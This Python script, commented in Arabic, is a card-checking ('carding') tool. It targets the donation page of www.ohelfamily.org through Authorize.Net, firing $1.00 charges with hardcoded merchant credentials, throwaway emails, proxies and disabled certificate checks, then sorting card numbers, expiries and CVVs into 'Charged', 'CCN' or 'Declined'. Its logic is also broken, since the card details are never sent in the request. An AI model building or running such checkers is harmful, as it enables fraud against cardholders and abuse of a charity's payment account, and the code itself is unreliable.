"""
بوابة الدفع: Authorize.Net Charge Au-1
الموقع: www.ohelfamily.org
نوع البوابة: Authorize.Net Charge
تدفق الطلبات:
1. GET /donate/ -> استخراج form_token + authData (Authorize.Net Accept.js tokens)
2. POST https://api.authorize.net/xml/v1/request.api (createTransactionRequest) -> النتيجة
"""
import aiohttp
import asyncio
import uuid
import ssl
import re


async def req1_get_form_token(
    session: aiohttp.ClientSession,
    proxy_url: str = None,
) -> str:
    """الخطوة 1: جلب form_token من صفحة التبرع."""
    try:
        async with session.get(
            "https://www.ohelfamily.org/donate/",
            proxy=proxy_url,
        ) as r:
            text = await r.text()

        form_token_match = re.search(r'name="form_token" value="(.*?)"', text)
        return form_token_match.group(1) if form_token_match else ""
    except Exception as e:
        raise RuntimeError(f"req1_get_form_token failed: {e}") from e


async def req2_charge(
    session: aiohttp.ClientSession,
    form_token: str,
    proxy_url: str = None,
) -> dict:
    """الخطوة 2: إرسال طلب الشحن عبر Authorize.Net API."""
    payload = {
        "createTransactionRequest": {
            "merchantAuthentication": {
                "name": "7876S6uV",
                "transactionKey": "28876S6uV",
            },
            "refId": str(uuid.uuid4())[:8],
            "transactionRequest": {
                "transactionType": "authCaptureTransaction",
                "amount": "1.00",
                "payment": {
                    "opaqueData": {
                        "dataDescriptor": "COMMON.ACCEPT.INAPP.PAYMENT",
                        "dataValue": form_token,
                    }
                },
                "customer": {
                    "email": f"{str(uuid.uuid4())[:8]}@gmail.com",
                },
            },
        }
    }
    try:
        async with session.post(
            "https://api.authorize.net/xml/v1/request.api",
            json=payload,
            proxy=proxy_url,
        ) as r:
            return await r.json(content_type=None)
    except Exception as e:
        raise RuntimeError(f"req2_charge failed: {e}") from e


async def process_Au_1(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة Authorize.Net Charge Au-1."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            form_token = await req1_get_form_token(session, proxy_url)
            response_json = await req2_charge(session, form_token, proxy_url)

    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"

    transaction_response = response_json.get("transactionResponse", {})
    response_code = str(transaction_response.get("responseCode", ""))

    if response_code == "1":
        return f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝 ✅ | {cc}|{mes}|{ano}|{cvv}", "Approved"
    elif "cvv" in str(transaction_response).lower():
        return f"𝐂𝐂𝐍 ♻️ | {cc}|{mes}|{ano}|{cvv}", "CVV2 FAILURE"
    else:
        errors = transaction_response.get("errors", [])
        if errors:
            response_msg = errors[0].get("errorText", "Declined")
        else:
            msgs = response_json.get("messages", {}).get("message", [{}])
            response_msg = msgs[0].get("text", "Declined") if msgs else "Declined"
        return f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ | {cc}|{mes}|{ano}|{cvv}", response_msg
